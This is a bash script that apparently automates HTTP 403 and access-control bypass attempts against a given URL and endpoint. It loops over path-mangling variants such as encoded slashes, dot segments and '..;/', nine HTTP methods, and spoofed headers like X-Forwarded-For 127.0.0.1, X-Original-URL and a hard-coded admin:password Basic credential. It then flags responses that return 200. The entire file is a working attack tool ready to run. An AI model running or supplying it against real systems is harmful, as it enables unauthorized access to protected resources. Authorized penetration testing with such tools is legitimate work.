#!/bin/bash

# Define colors for terminal output
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'  # No Color

# Log file for results
LOG_FILE="bypass_results.log"
> "$LOG_FILE"  # Clear the log file

# Function to perform an HTTP request
perform_request() {
    local url=$1
    local method=${2:-GET}
    local headers=$3

    # Perform the curl request and capture HTTP code and size in one go
    response=$(curl -k -s -o /dev/null -A "Mozilla/5.0" -iL -w "%{http_code},%{size_download}" -X "$method" -H "$headers" "$url")
    http_code=$(echo "$response" | cut -d',' -f1)
    size_download=$(echo "$response" | cut -d',' -f2)

    # Log the result
    echo "$method $http_code $size_download --> $url $headers" >> "$LOG_FILE"

    # Colorize output based on HTTP status code
    if [ "$http_code" -eq 200 ]; then
        echo -e " $method ${GREEN}${http_code}${NC} ${size_download} --> $url"
    else
        echo -e " $method ${RED}${http_code}${NC} ${size_download} --> $url"
    fi
}

# URL encode a single character
url_encode() {
    printf '%%%02X' "'$1"
}

# Double URL encode a character
double_url_encode() {
    local encoded_char
    encoded_char=$(url_encode "$1")
    printf '%s' "$encoded_char" | sed 's/%/%25/g'
}

# Generate all URL variations
generate_urls() {
    local base_url=$1
    local path=$2
    local last_char="${path: -1}"

    # URL encode the last character
    encoded_last_char=$(url_encode "$last_char")
    double_encoded_last_char=$(double_url_encode "$last_char")

    # Replace the last character of the path
    encoded_path="${path%?}$encoded_last_char"
    double_encoded_path="${path%?}$double_encoded_last_char"

    # Generate URL variations
    urls=(
        "$base_url/$path"
        "$base_url/$encoded_path"
        "$base_url/$double_encoded_path"
        "$base_url///$path"
        "$base_url/./$path"
        "$base_url/../$path"
        "$base_url/*/$path"
        "$base_url/%2f/$path"
        "$base_url/$path%2f"
        "$base_url/$path%252f"
        "$base_url/$path;%2f..%2f..%2f"
        "$base_url/%2e/$path"
        "$base_url/$path/."
        "$base_url/$path%20"
        "$base_url/$path%09"
        "$base_url/$path?anything"
        "$base_url/$path#"
        "$base_url/$path/*"
        "$base_url/$path.php"
        "$base_url/$path.json"
        "$base_url/$path..;/"
        "$base_url/$path;/"
        "$base_url/$path.html"
        "$base_url/$path?."
        "$base_url/$path.."
        "$base_url/$path/.hidden"
    )
    echo "${urls[@]}"
}

# Main function
main() {
    local base_url=$1
    local path=$2

    echo -e "[ Target: $base_url/$path ]\n"

    # HTTP Methods to test
    methods=("GET" "POST" "PUT" "DELETE" "OPTIONS" "HEAD" "TRACE" "PATCH" "CONNECT")

    # Headers for bypass testing
    headers_list=(
        "X-Originating-IP: 127.0.0.1"
        "X-Forwarded-For: 127.0.0.1"
        "X-Real-IP: 127.0.0.1"
        "X-Custom-IP-Authorization: 127.0.0.1"
        "X-Forwarded-Host: 127.0.0.1"
        "Content-Length: 0"
        "Host: localhost"
        "Host: google.com"
        "Forwarded: for=127.0.0.1"
        "Client-IP: 127.0.0.1"
        "True-Client-IP: 127.0.0.1"
        "Cluster-Client-IP: 127.0.0.1"
        "Referer: $base_url/$path"
        "X-Original-URL: $path"
        "X-Rewrite-URL: $path"
        "X-Requested-With: XMLHttpRequest"
        "Accept-Encoding: gzip, deflate"
        "Authorization: Basic YWRtaW46cGFzc3dvcmQ="
        "X-Forwarded-Proto: https"
        "Origin: null"
    )

    # Generate URL variations
    url_variations=$(generate_urls "$base_url" "$path")

    # Test all combinations of methods, headers, and URLs
    echo -e "\n[ Testing Bypass Techniques ]"
    for url in $url_variations; do
        for method in "${methods[@]}"; do
            for header in "${headers_list[@]}"; do
                perform_request "$url" "$method" "$header" &
                # Uncomment the following line to avoid parallel execution
                 wait
            done
        done
    done

    wait  # Wait for all background requests to complete
    echo -e "\nResults saved in $LOG_FILE"
}

# Check for correct usage
if [ "$#" -ne 2 ]; then
    echo -e "${RED}Usage: $0 <base_url> <endpoint>${NC}"
    exit 1
fi

# Call the main function
main "$1" "$2"
